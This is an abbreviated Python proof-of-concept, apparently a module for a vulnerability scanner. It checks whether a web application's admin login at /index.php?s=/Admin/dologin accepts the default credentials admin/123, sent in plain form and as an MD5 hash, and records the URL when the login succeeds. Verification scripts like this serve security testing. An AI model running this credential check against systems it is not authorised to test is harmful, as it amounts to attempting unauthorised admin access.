...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        result = {}
        path = "/index.php?s=/Admin/dologin/name/admin/pwd/123"
        path_md5 = "/index.php?s=/Admin/dologin/name/admin/pwd/202cb962ac59075b964b07152d234b70"
        headers={
        ...
        try:
            ...
            if resq.status_code == 200 and json.loads(resq.text)['status'] == 1:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path
            else:
                resq = requests.get(url=self.url+path_md5,headers=headers,timeout=10)
                if resq.status_code == 200 and json.loads(resq.text)['status'] == 1:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url + path_md5
